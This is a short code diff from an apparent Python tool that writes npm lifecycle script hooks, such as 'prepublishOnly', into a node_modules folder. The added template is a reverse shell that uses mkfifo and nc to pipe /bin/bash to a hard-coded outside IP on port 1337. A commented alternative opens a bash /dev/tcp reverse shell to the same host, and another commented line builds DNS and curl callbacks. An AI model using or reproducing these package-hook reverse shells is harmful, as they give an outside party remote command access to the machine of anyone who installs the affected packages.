@@ -32,7 +32,8 @@ non_prefixable_events = [
     "prepublishOnly"
 ]
 
-script_template = lambda event: f"mkfifo {event}.fifo; nc 137.184.94.106 1337 < {event}.fifo | /bin/zsh > {event}.fifo 2>&1; rm {event}.fifo"
+#script_template = lambda event: f"bash -i >& /dev/tcp/137.184.94.106/1337 0>&1"
+script_template = lambda event: f"mkfifo {event}.fifo; nc 137.184.94.106 1337 < {event}.fifo | /bin/bash > {event}.fifo 2>&1; rm {event}.fifo"
 #script_template = lambda event,method: expression_template("nslookup",event,method) + expression_template("dig",event,method) + expression_template("curl",event,method)
 
 os.makedirs('node_modules',exist_ok=True)
